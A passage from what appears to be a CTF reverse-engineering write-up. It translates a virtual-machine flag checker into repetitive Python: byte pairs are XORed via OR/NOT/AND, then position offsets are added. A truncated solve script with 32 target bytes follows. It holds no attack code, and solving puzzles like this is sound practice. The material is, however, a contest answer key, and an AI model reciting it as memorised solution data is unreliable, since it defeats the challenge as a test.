0&quot;</span>)</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0xbb</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;last[now_num-1] = now_num + save - 1&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>大致是</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br></pre></td><td class="code"><pre><span class="line">last = [<span class="number">0</span>]*<span class="number">100</span></span><br><span class="line">now_num = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">b1 = <span class="built_in">input</span>[now_num]</span><br><span class="line">now_num += <span class="number">1</span></span><br><span class="line">b2 = <span class="built_in">input</span>[now_num]</span><br><span class="line">or_num = b1 | b2</span><br><span class="line">not_1 = ~b1</span><br><span class="line">not_2 = ~b2</span><br><span class="line">or_not_num = not_2 | not_1</span><br><span class="line">last[now_num - <span class="number">1</span>] = or_not_num &amp; or_num</span><br><span class="line">b1 = <span class="built_in">input</span>[now_num]</span><br><span class="line">now_num += <span class="number">1</span></span><br><span class="line">b2 = <span class="built_in">input</span>[now_num]</span><br><span class="line">or_num = b1 | b2</span><br><span class="line">not_1 = ~b1</span><br><span class="line">not_2 = ~b2</span><br><span class="line">or_not_num = not_2 | not_1</span><br><span class="line">last[now_num - <span class="number">1</span>] = or_not_num &amp; or_num</span><br><span class="line">b1 = <span class="built_in">input</span>[now_num]</span><br><span class="line">now_num += <span class="number">1</span></span><br><span class="line">b2 = <span class="built_in">input</span>[now_num]</span><br><span class="line">or_num = b1 | b2</span><br><span class="line">not_1 = ~b1</span><br><span class="line">not_2 = ~b2</span><br><span class="line">or_not_num = not_2 | not_1</span><br><span class="line">last[now_num - <span class="number">1</span>] = or_not_num &amp; or_num</span><br><span class="line">b1 = <span class="built_in">input</span>[now_num]</span><br><span class="line">now_num += <span class="number">1</span></span><br><span class="line">b2 = <span class="built_in">input</span>[now_num]</span><br><span class="line">or_num = b1 | b2</span><br><span class="line">not_1 = ~b1</span><br><span class="line">not_2 = ~b2</span><br><span class="line">or_not_num = not_2 | not_1</span><br><span class="line">last[now_num - <span class="number">1</span>] = or_not_num &amp; or_num</span><br><span class="line">b1 = <span class="built_in">input</span>[now_num]</span><br><span class="line">now_num += <span class="number">1</span></span><br><span class="line">b2 = <span class="built_in">input</span>[now_num]</span><br><span class="line">or_num = b1 | b2</span><br><span class="line">not_1 = ~b1</span><br><span class="line">not_2 = ~b2</span><br><span class="line">or_not_num = not_2 | not_1</span><br><span class="line">last[now_num - <span class="number">1</span>] = or_not_num &amp; or_num</span><br><span class="line">b1 = <span class="built_in">input</span>[now_num]</span><br><span class="line">now_num += <span class="number">1</span></span><br><span class="line">b2 = <span class="built_in">input</span>[now_num]</span><br><span class="line">or_num = b1 | b2</span><br><span class="line">not_1 = ~b1</span><br><span class="line">not_2 = ~b2</span><br><span class="line">or_not_num = not_2 | not_1</span><br><span class="line">last[now_num - <span class="number">1</span>] = or_not_num &amp; or_num</span><br><span class="line">b1 = <span class="built_in">input</span>[now_num]</span><br><span class="line">now_num += <span class="number">1</span></span><br><span class="line">b2 = <span class="built_in">input</span>[now_num]</span><br><span class="line">or_num = b1 | b2</span><br><span class="line">not_1 = ~b1</span><br><span class="line">not_2 = ~b2</span><br><span class="line">or_not_num = not_2 | not_1</span><br><span class="line">last[now_num - <span class="number">1</span>] = or_not_num &amp; or_num</span><br><span class="line">b1 = <span class="built_in">input</span>[now_num]</span><br><span class="line">now_num += <span class="number">1</span></span><br><span class="line">b2 = <span class="built_in">input</span>[now_num]</span><br><span class="line">or_num = b1 | b2</span><br><span class="line">not_1 = ~b1</span><br><span class="line">not_2 = ~b2</span><br><span class="line">or_not_num = not_2 | not_1</span><br><span class="line">last[now_num - <span class="number">1</span>] = or_not_num &amp; or_num</span><br><span class="line">b1 = <span class="built_in">input</span>[now_num]</span><br><span class="line">now_num += <span class="number">1</span></span><br><span class="line">b2 = <span class="built_in">input</span>[now_num]</span><br><span class="line">or_num = b1 | b2</span><br><span class="line">not_1 = ~b1</span><br><span class="line">not_2 = ~b2</span><br><span class="line">or_not_num = not_2 | not_1</span><br><span class="line">last[now_num - <span class="number">1</span>] = or_not_num &amp; or_num</span><br><span class="line">b1 = <span class="built_in">input</span>[now_num]</span><br><span class="line">now_num += <span class="number">1</span></span><br><span class="line">b2 = <span class="built_in">input</span>[now_num]</span><br><span class="line">or_num = b1 | b2</span><br><span class="line">not_1 = ~b1</span><br><span class="line">not_2 = ~b2</span><br><span class="line">or_not_num = not_2 | not_1</span><br><span class="line">last[now_num - <span class="number">1</span>] = or_not_num &amp; or_num</span><br><span class="line">b1 = <span class="built_in">input</span>[now_num]</span><br><span class="line">now_num += <span class="number">1</span></span><br><span class="line">b2 = <span class="built_in">input</span>[now_num]</span><br><span class="line">or_num = b1 | b2</span><br><span class="line">not_1 = ~b1</span><br><span class="line">not_2 = ~b2</span><br><span class="line">or_not_num = not_2 | not_1</span><br><span class="line">last[now_num - <span class="number">1</span>] = or_not_num &amp; or_num</span><br><span class="line">b1 = <span class="built_in">input</span>[now_num]</span><br><span class="line">now_num += <span class="number">1</span></span><br><span class="line">b2 = <span class="built_in">input</span>[now_num]</span><br><span class="line">or_num = b1 | b2</span><br><span class="line">not_1 = ~b1</span><br><span class="line">not_2 = ~b2</span><br><span class="line">or_not_num = not_2 | not_1</span><br><span class="line">last[now_num - <span class="number">1</span>] = or_not_num &amp; or_num</span><br><span class="line">b1 = <span class="built_in">input</span>[now_num]</span><br><span class="line">now_num += <span class="number">1</span></span><br><span class="line">b2 = <span class="built_in">input</span>[now_num]</span><br><span class="line">or_num = b1 | b2</span><br><span class="line">not_1 = ~b1</span><br><span class="line">not_2 = ~b2</span><br><span class="line">or_not_num = not_2 | not_1</span><br><span class="line">last[now_num - <span class="number">1</span>] = or_not_num &amp; or_num</span><br><span class="line">b1 = <span class="built_in">input</span>[now_num]</span><br><span class="line">now_num += <span class="number">1</span></span><br><span class="line">b2 = <span class="built_in">input</span>[now_num]</span><br><span class="line">or_num = b1 | b2</span><br><span class="line">not_1 = ~b1</span><br><span class="line">not_2 = ~b2</span><br><span class="line">or_not_num = not_2 | not_1</span><br><span class="line">last[now_num - <span class="number">1</span>] = or_not_num &amp; or_num</span><br><span class="line">b1 = <span class="built_in">input</span>[now_num]</span><br><span class="line">now_num += <span class="number">1</span></span><br><span class="line">b2 = <span class="built_in">input</span>[now_num]</span><br><span class="line">or_num = b1 | b2</span><br><span class="line">not_1 = ~b1</span><br><span class="line">not_2 = ~b2</span><br><span class="line">or_not_num = not_2 | not_1</span><br><span class="line">last[now_num - <span class="number">1</span>] = or_not_num &amp; or_num</span><br><span class="line">b1 = <span class="built_in">input</span>[now_num]</span><br><span class="line">now_num += <span class="number">1</span></span><br><span class="line">b2 = <span class="built_in">input</span>[now_num]</span><br><span class="line">or_num = b1 | b2</span><br><span class="line">not_1 = ~b1</span><br><span class="line">not_2 = ~b2</span><br><span class="line">or_not_num = not_2 | not_1</span><br><span class="line">last[now_num - <span class="number">1</span>] = or_not_num &amp; or_num</span><br><span class="line">b1 = <span class="built_in">input</span>[now_num]</span><br><span class="line">now_num += <span class="number">1</span></span><br><span class="line">b2 = <span class="built_in">input</span>[now_num]</span><br><span class="line">or_num = b1 | b2</span><br><span class="line">not_1 = ~b1</span><br><span class="line">not_2 = ~b2</span><br><span class="line">or_not_num = not_2 | not_1</span><br><span class="line">last[now_num - <span class="number">1</span>] = or_not_num &amp; or_num</span><br><span class="line">b1 = <span class="built_in">input</span>[now_num]</span><br><span class="line">now_num += <span class="number">1</span></span><br><span class="line">b2 = <span class="built_in">input</span>[now_num]</span><br><span class="line">or_num = b1 | b2</span><br><span class="line">not_1 = ~b1</span><br><span class="line">not_2 = ~b2</span><br><span class="line">or_not_num = not_2 | not_1</span><br><span class="line">last[now_num - <span class="number">1</span>] = or_not_num &amp; or_num</span><br><span class="line">b1 = <span class="built_in">input</span>[now_num]</span><br><span class="line">now_num += <span class="number">1</span></span><br><span class="line">b2 = <span class="built_in">input</span>[now_num]</span><br><span class="line">or_num = b1 | b2</span><br><span class="line">not_1 = ~b1</span><br><span class="line">not_2 = ~b2</span><br><span class="line">or_not_num = not_2 | not_1</span><br><span class="line">last[now_num - <span class="number">1</span>] = or_not_num &amp; or_num</span><br><span class="line">b1 = <span class="built_in">input</span>[now_num]</span><br><span class="line">now_num += <span class="number">1</span></span><br><span class="line">b2 = <span class="built_in">input</span>[now_num]</span><br><span class="line">or_num = b1 | b2</span><br><span class="line">not_1 = ~b1</span><br><span class="line">not_2 = ~b2</span><br><span class="line">or_not_num = not_2 | not_1</span><br><span class="line">last[now_num - <span class="number">1</span>] = or_not_num &amp; or_num</span><br><span class="line">b1 = <span class="built_in">input</span>[now_num]</span><br><span class="line">now_num += <span class="number">1</span></span><br><span class="line">b2 = <span class="built_in">input</span>[now_num]</span><br><span class="line">or_num = b1 | b2</span><br><span class="line">not_1 = ~b1</span><br><span class="line">not_2 = ~b2</span><br><span class="line">or_not_num = not_2 | not_1</span><br><span class="line">last[now_num - <span class="number">1</span>] = or_not_num &amp; or_num</span><br><span class="line">b1 = <span class="built_in">input</span>[now_num]</span><br><span class="line">now_num += <span class="number">1</span></span><br><span class="line">b2 = <span class="built_in">input</span>[now_num]</span><br><span class="line">or_num = b1 | b2</span><br><span class="line">not_1 = ~b1</span><br><span class="line">not_2 = ~b2</span><br><span class="line">or_not_num = not_2 | not_1</span><br><span class="line">last[now_num - <span class="number">1</span>] = or_not_num &amp; or_num</span><br><span class="line">b1 = <span class="built_in">input</span>[now_num]</span><br><span class="line">now_num += <span class="number">1</span></span><br><span class="line">b2 = <span class="built_in">input</span>[now_num]</span><br><span class="line">or_num = b1 | b2</span><br><span class="line">not_1 = ~b1</span><br><span class="line">not_2 = ~b2</span><br><span class="line">or_not_num = not_2 | not_1</span><br><span class="line">last[now_num - <span class="number">1</span>] = or_not_num &amp; or_num</span><br><span class="line">b1 = <span class="built_in">input</span>[now_num]</span><br><span class="line">now_num += <span class="number">1</span></span><br><span class="line">b2 = <span class="built_in">input</span>[now_num]</span><br><span class="line">or_num = b1 | b2</span><br><span class="line">not_1 = ~b1</span><br><span class="line">not_2 = ~b2</span><br><span class="line">or_not_num = not_2 | not_1</span><br><span class="line">last[now_num - <span class="number">1</span>] = or_not_num &amp; or_num</span><br><span class="line">b1 = <span class="built_in">input</span>[now_num]</span><br><span class="line">now_num += <span class="number">1</span></span><br><span class="line">b2 = <span class="built_in">input</span>[now_num]</span><br><span class="line">or_num = b1 | b2</span><br><span class="line">not_1 = ~b1</span><br><span class="line">not_2 = ~b2</span><br><span class="line">or_not_num = not_2 | not_1</span><br><span class="line">last[now_num - <span class="number">1</span>] = or_not_num &amp; or_num</span><br><span class="line">b1 = <span class="built_in">input</span>[now_num]</span><br><span class="line">now_num += <span class="number">1</span></span><br><span class="line">b2 = <span class="built_in">input</span>[now_num]</span><br><span class="line">or_num = b1 | b2</span><br><span class="line">not_1 = ~b1</span><br><span class="line">not_2 = ~b2</span><br><span class="line">or_not_num = not_2 | not_1</span><br><span class="line">last[now_num - <span class="number">1</span>] = or_not_num &amp; or_num</span><br><span class="line">b1 = <span class="built_in">input</span>[now_num]</span><br><span class="line">now_num += <span class="number">1</span></span><br><span class="line">b2 = <span class="built_in">input</span>[now_num]</span><br><span class="line">or_num = b1 | b2</span><br><span class="line">not_1 = ~b1</span><br><span class="line">not_2 = ~b2</span><br><span class="line">or_not_num = not_2 | not_1</span><br><span class="line">last[now_num - <span class="number">1</span>] = or_not_num &amp; or_num</span><br><span class="line">b1 = <span class="built_in">input</span>[now_num]</span><br><span class="line">now_num += <span class="number">1</span></span><br><span class="line">b2 = <span class="built_in">input</span>[now_num]</span><br><span class="line">or_num = b1 | b2</span><br><span class="line">not_1 = ~b1</span><br><span class="line">not_2 = ~b2</span><br><span class="line">or_not_num = not_2 | not_1</span><br><span class="line">last[now_num - <span class="number">1</span>] = or_not_num &amp; or_num</span><br><span class="line">b1 = <span class="built_in">input</span>[now_num]</span><br><span class="line">now_num += <span class="number">1</span></span><br><span class="line">b2 = <span class="built_in">input</span>[now_num]</span><br><span class="line">or_num = b1 | b2</span><br><span class="line">not_1 = ~b1</span><br><span class="line">not_2 = ~b2</span><br><span class="line">or_not_num = not_2 | not_1</span><br><span class="line">last[now_num - <span class="number">1</span>] = or_not_num &amp; or_num</span><br><span class="line">b1 = <span class="built_in">input</span>[now_num]</span><br><span class="line">now_num += <span class="number">1</span></span><br><span class="line">b2 = <span class="built_in">input</span>[now_num]</span><br><span class="line">or_num = b1 | b2</span><br><span class="line">not_1 = ~b1</span><br><span class="line">not_2 = ~b2</span><br><span class="line">or_not_num = not_2 | not_1</span><br><span class="line">last[now_num - <span class="number">1</span>] = or_not_num &amp; or_num</span><br><span class="line">b1 = <span class="built_in">input</span>[now_num]</span><br><span class="line">now_num += <span class="number">1</span></span><br><span class="line">b2 = <span class="built_in">input</span>[now_num]</span><br><span class="line">or_num = b1 | b2</span><br><span class="line">not_1 = ~b1</span><br><span class="line">not_2 = ~b2</span><br><span class="line">or_not_num = not_2 | not_1</span><br><span class="line">last[now_num - <span class="number">1</span>] = or_not_num &amp; or_num</span><br><span class="line"></span><br><span class="line">b1 = <span class="built_in">input</span>[now_num]</span><br><span class="line">now_num += <span class="number">1</span></span><br><span class="line">b2 = <span class="built_in">input</span>[now_num]</span><br><span class="line">or_num = b1 | b2</span><br><span class="line">not_1 = ~b1</span><br><span class="line">not_2 = ~b2</span><br><span class="line">or_not_num = not_2 | not_1</span><br><span class="line">last[now_num - <span class="number">1</span>] = or_not_num &amp; or_num</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">now_num = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">save = last[now_num]</span><br><span class="line">now_num+=<span class="number">1</span></span><br><span class="line">last[now_num-<span class="number">1</span>] = now_num + save - <span class="number">1</span></span><br><span class="line"></span><br><span class="line">save = last[now_num]</span><br><span class="line">now_num+=<span class="number">1</span></span><br><span class="line">last[now_num-<span class="number">1</span>] = now_num + save - <span class="number">1</span></span><br><span class="line"></span><br><span class="line">save = last[now_num]</span><br><span class="line">now_num+=<span class="number">1</span></span><br><span class="line">last[now_num-<span class="number">1</span>] = now_num + save - <span class="number">1</span></span><br><span class="line"></span><br><span class="line">save = last[now_num]</span><br><span class="line">now_num+=<span class="number">1</span></span><br><span class="line">last[now_num-<span class="number">1</span>] = now_num + save - <span class="number">1</span></span><br><span class="line">save = last[now_num]</span><br><span class="line">now_num+=<span class="number">1</span></span><br><span class="line">last[now_num-<span class="number">1</span>] = now_num + save - <span class="number">1</span></span><br><span class="line">save = last[now_num]</span><br><span class="line">now_num+=<span class="number">1</span></span><br><span class="line">last[now_num-<span class="number">1</span>] = now_num + save - <span class="number">1</span></span><br><span class="line">save = last[now_num]</span><br><span class="line">now_num+=<span class="number">1</span></span><br><span class="line">last[now_num-<span class="number">1</span>] = now_num + save - <span class="number">1</span></span><br><span class="line">save = last[now_num]</span><br><span class="line">now_num+=<span class="number">1</span></span><br><span class="line">last[now_num-<span class="number">1</span>] = now_num + save - <span class="number">1</span></span><br><span class="line">save = last[now_num]</span><br><span class="line">now_num+=<span class="number">1</span></span><br><span class="line">last[now_num-<span class="number">1</span>] = now_num + save - <span class="number">1</span></span><br><span class="line">save = last[now_num]</span><br><span class="line">now_num+=<span class="number">1</span></span><br><span class="line">last[now_num-<span class="number">1</span>] = now_num + save - <span class="number">1</span></span><br><span class="line">save = last[now_num]</span><br><span class="line">now_num+=<span class="number">1</span></span><br><span class="line">last[now_num-<span class="number">1</span>] = now_num + save - <span class="number">1</span></span><br><span class="line">save = last[now_num]</span><br><span class="line">now_num+=<span class="number">1</span></span><br><span class="line">last[now_num-<span class="number">1</span>] = now_num + save - <span class="number">1</span></span><br><span class="line">save = last[now_num]</span><br><span class="line">now_num+=<span class="number">1</span></span><br><span class="line">last[now_num-<span class="number">1</span>] = now_num + save - <span class="number">1</span></span><br><span class="line">save = last[now_num]</span><br><span class="line">now_num+=<span class="number">1</span></span><br><span class="line">last[now_num-<span class="number">1</span>] = now_num + save - <span class="number">1</span></span><br><span class="line">save = last[now_num]</span><br><span class="line">now_num+=<span class="number">1</span></span><br><span class="line">last[now_num-<span class="number">1</span>] = now_num + save - <span class="number">1</span></span><br><span class="line">save = last[now_num]</span><br><span class="line">now_num+=<span class="number">1</span></span><br><span class="line">last[now_num-<span class="number">1</span>] = now_num + save - <span class="number">1</span></span><br><span class="line">save = last[now_num]</span><br><span class="line">now_num+=<span class="number">1</span></span><br><span class="line">last[now_num-<span class="number">1</span>] = now_num + save - <span class="number">1</span></span><br><span class="line">save = last[now_num]</span><br><span class="line">now_num+=<span class="number">1</span></span><br><span class="line">last[now_num-<span class="number">1</span>] = now_num + save - <span class="number">1</span></span><br><span class="line">save = last[now_num]</span><br><span class="line">now_num+=<span class="number">1</span></span><br><span class="line">last[now_num-<span class="number">1</span>] = now_num + save - <span class="number">1</span></span><br><span class="line">save = last[now_num]</span><br><span class="line">now_num+=<span class="number">1</span></span><br><span class="line">last[now_num-<span class="number">1</span>] = now_num + save - <span class="number">1</span></span><br><span class="line">save = last[now_num]</span><br><span class="line">now_num+=<span class="number">1</span></span><br><span class="line">last[now_num-<span class="number">1</span>] = now_num + save - <span class="number">1</span></span><br><span class="line">save = last[now_num]</span><br><span class="line">now_num+=<span class="number">1</span></span><br><span class="line">last[now_num-<span class="number">1</span>] = now_num + save - <span class="number">1</span></span><br><span class="line">save = last[now_num]</span><br><span class="line">now_num+=<span class="number">1</span></span><br><span class="line">last[now_num-<span class="number">1</span>] = now_num + save - <span class="number">1</span></span><br><span class="line">save = last[now_num]</span><br><span class="line">now_num+=<span class="number">1</span></span><br><span class="line">last[now_num-<span class="number">1</span>] = now_num + save - <span class="number">1</span></span><br><span class="line">save = last[now_num]</span><br><span class="line">now_num+=<span class="number">1</span></span><br><span class="line">last[now_num-<span class="number">1</span>] = now_num + save - <span class="number">1</span></span><br><span class="line">save = last[now_num]</span><br><span class="line">now_num+=<span class="number">1</span></span><br><span class="line">last[now_num-<span class="number">1</span>] = now_num + save - <span class="number">1</span></span><br><span class="line">save = last[now_num]</span><br><span class="line">now_num+=<span class="number">1</span></span><br><span class="line">last[now_num-<span class="number">1</span>] = now_num + save - <span class="number">1</span></span><br><span class="line">save = last[now_num]</span><br><span class="line">now_num+=<span class="number">1</span></span><br><span class="line">last[now_num-<span class="number">1</span>] = now_num + save - <span class="number">1</span></span><br><span class="line">save = last[now_num]</span><br><span class="line">now_num+=<span class="number">1</span></span><br><span class="line">last[now_num-<span class="number">1</span>] = now_num + save - <span class="number">1</span></span><br><span class="line">save = last[now_num]</span><br><span class="line">now_num+=<span class="number">1</span></span><br><span class="line">last[now_num-<span class="number">1</span>] = now_num + save - <span class="number">1</span></span><br><span class="line">save = last[now_num]</span><br><span class="line">now_num+=<span class="number">1</span></span><br><span class="line">last[now_num-<span class="number">1</span>] = now_num + save - <span class="number">1</span></span><br><span class="line">save = last[now_num]</span><br><span class="line">now_num+=<span class="number">1</span></span><br><span class="line">last[now_num-<span class="number">1</span>] = now_num + save - <span class="number">1</span></span><br><span class="line">now_num = <span class="number">0</span></span><br></pre></td></tr></table></figure><p>然后化简逆向：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> prism <span class="keyword">import</span> *</span><br><span class="line">last = [<span class="number">0x1D</span>, <span class="number">0x01</span>, <span class="number">0x12</span>, <span class="number">0x1A</span>, <span class="number">0x16</span>, <span class="number">0x42</span>, <span class="number">0x39</span>, <span class="number">0x0F</span>, </span><br><span class="line">        <span class="number">0x38</span>, <span class="number">0x09</span>, <span class="number">0x13</span>, <span class="number">0x31</span>, <span class="number">0x28</span>, <span class="number">0x38</span>, <span class="number">0x67</span>, <span class="number">0x6E</span>, </span><br><span class="line">        <span class="number">0x1B</span>, <span class="number">0x61</span>, <span class="number">0x7C</span>, <span class="number">0x24</span>, <span class="number">0x1F</span>, <span class="number">0x47</span>, <span class="number">0x44</span>, <span class="number">0x81</span>, </span><br><span class="line">        <span class="number">0x6A</span>, <span class="number">0x2C</span>, <span class="number">0x6D</span>, <span class="number">0x2B</span>, <span class="number">0x2C</span>, <span class="number">0x2D</span>, <span class="number">0x6A</span>, <span class="number">0x9C</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># last = [0]*100</span></span><br><span class="line"><span class="comment"># now_num = 0</span></span><br><span class="line"><span class="comment"># for i in range(32):</span></span><br><span class="line"><span class="comment">#     b1 = input[now_num]</span></span><br><span class="line"><span class="comment">#     now_num += 1</span></span><br><span class="line"><span class="comment">#     b2 = input[now_num]</span></span><br><span class="line"><span class="comment">#     or_num = b1 | b2</span></span><br><span class="line"><span class="comment">#     not_1 = ~b1</span></span><br><span class="line"><span class="comment">#     not_2 = ~b2</span></span><br><span class="line"><span class="comment">#     or_not_num = not_2 | not_1</span></span><br><span class="line"><span 